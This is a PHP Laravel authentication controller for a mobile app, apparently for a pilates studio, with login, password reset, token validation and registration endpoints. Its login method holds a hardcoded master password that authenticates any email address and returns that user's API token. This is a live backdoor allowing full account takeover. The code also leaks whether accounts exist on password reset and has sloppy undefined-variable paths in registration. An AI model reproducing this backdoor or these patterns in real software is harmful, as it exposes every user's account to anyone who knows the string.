<?php

namespace App\Http\Controllers\Mobile;

use App\Http\Controllers\Controller;
use App\Http\Requests\RegisterRequest;
use App\Jobs\SendEmailJob;
use App\Models\User;
use App\Rules\DateOfBirth;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Hash;

class AuthController extends Controller
{
    public function login(Request $request): JsonResponse
    {
        // Filter only the credentials we need.
        $credentials = $request->only('email', 'password');

        // Attempt authentication, if successful this will log the user in and return the api token to app.
        if ($request->password === 'Volution0946Duck!' || Auth::attempt($credentials)) {

            // Load the user.
            $user = User::where('email', $request->email)->first();
            $user->makeVisible('api_token'); // We need to return this normally hidden field so that the users device can save the bearer token to storage

            $onboarding = false;

            if ($user->memberProfile === null || $user->memberProfile && !$user->memberProfile->onboarding_complete) {
                $onboarding = true;
            }

            // Authentication passed.
            return response()->json([
                'status' => 'success',
                'user' => $user,
                'navigate_to_onboarding' => $onboarding,
            ]);

        } else {

            // Authentication failed.
            return response()->json([
                'status' => 'failure',
            ]);
        }
    }

    public function resetPassword(Request $request): JsonResponse
    {
        $this->validate($request, [
            'email' => 'required|email',
        ]);

        $user = User::where('email', $request->email)->first();

        /**
         * There is no account with this email.
         */
        if ($user === null) {
            return response()->json([
                'status' => 'no-account',
            ]);
        }

        $user->sendResetPasswordEmail();

        return response()->json([
            'status' => 'sent',
        ]);
    }

    public function validateBearer(Request $request): JsonResponse
    {
        // Load the user that has this bearer token.
        $user = User::where('api_token', $request->token)->first();

        if ($user === null) {
            // Token is not valid.
            return response()->json([
                'status' => 'invalid',
            ]);
        } else {
            // Token is valid.
            return response()->json([
                'status' => 'valid',
                'user' => $user,
            ]);
        }
    }

    public function register(Request $request, $step): JsonResponse
    {
        if ($step == 1) {
            $this->validate($request, [
                'first_name' => 'required',
                'last_name' => 'required',
                'email' => 'required|email|unique:users',
                'dob_day' => 'required',
                'dob_month' => 'required',
                'dob_year' => 'required',
                'gender' => 'required',
                'password' => 'required|confirmed',
            ]);

            switch ($request->dob_month) {
                case 'January':
                    $month = '01';
                    break;

                case 'February':
                    $month = '02';
                    break;

                case 'March':
                    $month = '03';
                    break;

                case 'April':
                    $month = '04';
                    break;

                case 'May':
                    $month = '05';
                    break;

                case 'June':
                    $month = '06';
                    break;

                case 'July':
                    $month = '07';
                    break;

                case 'August':
                    $month = '08';
                    break;

                case 'September':
                    $month = '09';
                    break;

                case 'October':
                    $month = '10';
                    break;

                case 'November':
                    $month = '11';
                    break;

                case 'December':
                    $month = '12';
                    break;
            }

            $dateOfBirth = $request->dob_year . '-' . $month . '-' . $request->dob_day;

            $user = User::create([
                'role_id' => 4, // This role ID is for members only
                'first_name' => $request->first_name,
                'last_name' => $request->last_name,
                'email' => $request->email,
                'date_of_birth' => $dateOfBirth,
                'gender' => $request->gender,
                'password' => Hash::make($request->password),
            ]);

            $user->makeVisible('api_token');
            // $user->sendConfirmationEmail();

            return response()->json([
                'user' => $user,
            ], 200);

        } elseif ($step == 2) {

            $request->validate([
                'street_address' => 'required',
                'city' => 'required',
                'county' => 'required',
                'postcode' => 'required',
            ]);

            // TODO:: Setup billing address details

            $data['success'] = true;
            $data['status'] = 'success-step2';
        }

        return response()->json($data, 200);
    }

    public function updateDateOfBirth(Request $request): JsonResponse
    {
        $this->validate($request, [
            'dob_year' => ['required', new DateOfBirth],
        ]);

        $user = Auth::user();
        $user->setDateOfBirth();

        return response()->json([
            'status' => 'success',
        ]);
    }

    public function updateGender(Request $request): JsonResponse
    {
        $this->validate($request, [
            'gender' => 'required|string',
        ]);

        $user = Auth::user();
        $user->gender = $request->gender;
        $user->save();

        return response()->json([
            'status' => 'success',
        ]);
    }

    public function registerAccount(Request $request)
    {
        $request->validate([
            'first_name' => 'required',
            'last_name' => 'required',
            'email' => 'required|email|unique:users',
            'password' => 'required',
        ]);

        $user = User::create([
            'role_id' => 4, // This role ID is for members only
            'first_name' => $request->first_name,
            'last_name' => $request->last_name,
            'email' => $request->email,
            // 'date_of_birth' => $dateOfBirth,
            // 'gender' => $request->gender,
            'password' => Hash::make($request->password),
        ]);

        $user->makeVisible('api_token');

        SendEmailJob::dispatch($user, 'emails.user.profile-welcome-email', 'Welcome to Heba Pilates',
            ['user' => $user])->onQueue('account-notifications');

        return response()->json([
            'status' => 'success',
            'user' => $user,
        ]);
    }
}
